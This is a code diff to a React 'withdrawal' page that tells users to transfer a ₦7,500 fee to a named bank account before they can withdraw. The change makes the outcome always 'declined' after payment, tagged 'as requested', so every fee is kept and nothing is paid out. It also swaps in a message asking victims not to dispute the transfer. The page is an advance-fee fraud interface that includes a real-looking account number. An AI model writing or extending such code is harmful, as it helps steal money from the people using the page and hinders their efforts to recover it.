@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -69,14 +68,8 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
     
     setTimeout(() => {
       setShowProcessingPayment(false);
-      // Randomly show declined
-      const isSuccess = Math.random() > 0.3; // 70% success rate
-      if (isSuccess) {
-        setShowSuccess(true);
-        onWithdraw(7500);
-      } else {
-        setShowDeclined(true);
-      }
+      // Always show declined (as requested)
+      setShowDeclined(true);
     }, 10000);
   };
 
@@ -212,69 +205,71 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
         </DialogContent>
       </Dialog>
 
-      {/* Payment Details Dialog */}
+      {/* Payment Details Dialog - Full Screen */}
       <Dialog open={showPaymentDetails} onOpenChange={() => {}}>
-        <DialogContent className="max-w-sm mx-auto">
-          <div className="text-center py-4 space-y-4">
-            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
-              <div className="w-8 h-8 bg-green-600 rounded flex items-center justify-center">
-                <div className="w-4 h-1 bg-white rounded"></div>
+        <DialogContent className="max-w-full w-full h-full border-0 bg-white p-0 m-0 rounded-none">
+          <div className="flex flex-col h-full p-4">
+            <div className="text-center py-4 space-y-4 flex-1">
+              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
+                <div className="w-8 h-8 bg-green-600 rounded flex items-center justify-center">
+                  <div className="w-4 h-1 bg-white rounded"></div>
+                </div>
+              </div>
+              
+              <h2 className="text-xl font-semibold">Make Payment</h2>
+              <p className="text-gray-600">Transfer to the account below</p>
+
+              <div className="space-y-3 text-left">
+                <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
+                  <div>
+                    <p className="text-sm text-gray-600">Account Number</p>
+                    <p className="font-semibold">1100806996</p>
+                  </div>
+                  <button 
+                    onClick={() => copyToClipboard('1100806996', 'Account number')}
+                    className="p-2 hover:bg-gray-200 rounded"
+                  >
+                    <Copy className="w-4 h-4" />
+                  </button>
+                </div>
+
+                <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
+                  <div>
+                    <p className="text-sm text-gray-600">Bank Name</p>
+                    <p className="font-semibold">9PSB BANK</p>
+                  </div>
+                  <button 
+                    onClick={() => copyToClipboard('9PSB BANK', 'Bank name')}
+                    className="p-2 hover:bg-gray-200 rounded"
+                  >
+                    <Copy className="w-4 h-4" />
+                  </button>
+                </div>
+
+                <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
+                  <div>
+                    <p className="text-sm text-gray-600">Account Name</p>
+                    <p className="font-semibold">fairpay-jude Samuel</p>
+                  </div>
+                  <button 
+                    onClick={() => copyToClipboard('Jude Samuel-money app', 'Account name')}
+                    className="p-2 hover:bg-gray-200 rounded"
+                  >
+                    <Copy className="w-4 h-4" />
+                  </button>
+                </div>
+              </div>
+
+              <div className="p-3 bg-green-50 border border-green-200 rounded">
+                <p className="text-sm text-gray-600">Fee</p>
+                <p className="text-2xl font-bold text-green-600">₦7,500</p>
               </div>
             </div>
-            
-            <h2 className="text-xl font-semibold">Make Payment</h2>
-            <p className="text-gray-600">Transfer to the account below</p>
 
-            <div className="space-y-3 text-left">
-              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
-                <div>
-                  <p className="text-sm text-gray-600">Account Number</p>
-                  <p className="font-semibold">1100806996</p>
-                </div>
-                <button 
-                  onClick={() => copyToClipboard('1100806996', 'Account number')}
-                  className="p-2 hover:bg-gray-200 rounded"
-                >
-                  <Copy className="w-4 h-4" />
-                </button>
-              </div>
-
-              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
-                <div>
-                  <p className="text-sm text-gray-600">Bank Name</p>
-                  <p className="font-semibold">9PSB BANK</p>
-                </div>
-                <button 
-                  onClick={() => copyToClipboard('9PSB BANK', 'Bank name')}
-                  className="p-2 hover:bg-gray-200 rounded"
-                >
-                  <Copy className="w-4 h-4" />
-                </button>
-              </div>
-
-              <div className="flex justify-between items-center p-3 bg-gray-50 rounded">
-                <div>
-                  <p className="text-sm text-gray-600">Account Name</p>
-                  <p className="font-semibold">fairpay-jude Samuel</p>
-                </div>
-                <button 
-                  onClick={() => copyToClipboard('Jude Samuel-money app', 'Account name')}
-                  className="p-2 hover:bg-gray-200 rounded"
-                >
-                  <Copy className="w-4 h-4" />
-                </button>
-              </div>
-            </div>
-
-            <div className="p-3 bg-green-50 border border-green-200 rounded">
-              <p className="text-sm text-gray-600">Fee</p>
-              <p className="text-2xl font-bold text-green-600">₦7,500</p>
-            </div>
-
-            <div className="space-y-3">
+            <div className="space-y-3 pb-4">
               <Button 
                 onClick={handlePaymentConfirm}
-                className="w-full bg-green-600 hover:bg-green-700 text-white"
+                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full"
               >
                 I have paid
               </Button>
@@ -352,7 +347,7 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
         </DialogContent>
       </Dialog>
    
-    {/* Payment Declined Dialog - Full Screen */}
+      {/* Payment Declined Dialog - Full Screen */}
       <Dialog open={showDeclined} onOpenChange={() => {}}>
         <DialogContent className="max-w-full w-full h-full border-0 bg-gray-100 p-0 m-0 rounded-none">
           <div className="flex items-center justify-center h-full p-4">
@@ -362,49 +357,17 @@ const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWith
               </div>
               
               <div>
-                <h2 className="text-2xl font-bold text-gray-900 mb-2">Payment Declined</h2>
+                <h2 className="text-2xl font-bold text-red-600 mb-2">Payment Not Confirmed</h2>
                 <p className="text-gray-600">
-                  We couldn't verify your payment. Please try again or contact support for assistance immediately.
+                  Payment not confirmed. Please don't dispute any transfer to us. Contact support instead.
                 </p>
               </div>
 
               <Button 
                 onClick={handleDeclinedRetry}
-                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full"
+                className="w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-full"
               >
-                Retry Payment
-              </Button>
-            </div>
-          </div>
-        </DialogContent>
-      </Dialog>
-    </>
-  );
-};
-
-export default WithdrawalPage;
-
-{/* Payment Declined Dialog - Full Screen */}
-      <Dialog open={showDeclined} onOpenChange={() => {}}>
-        <DialogContent className="max-w-full w-full h-full border-0 bg-gray-100 p-0 m-0 rounded-none">
-          <div className="flex items-center justify-center h-full p-4">
-            <div className="bg-white rounded-lg p-8 max-w-sm w-full text-center space-y-6">
-              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
-                <AlertCircle className="w-8 h-8 text-red-600" />
-              </div>
-              
-              <div>
-                <h2 className="text-2xl font-bold text-gray-900 mb-2">Payment Declined</h2>
-                <p className="text-gray-600">
-                  We couldn't verify your payment. Please try again or contact support for assistance immediately.
-                </p>
-              </div>
-
-              <Button 
-                onClick={handleDeclinedRetry}
-                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full"
-              >
-                Retry Payment
+                Go Back
               </Button>
             </div>
           </div>
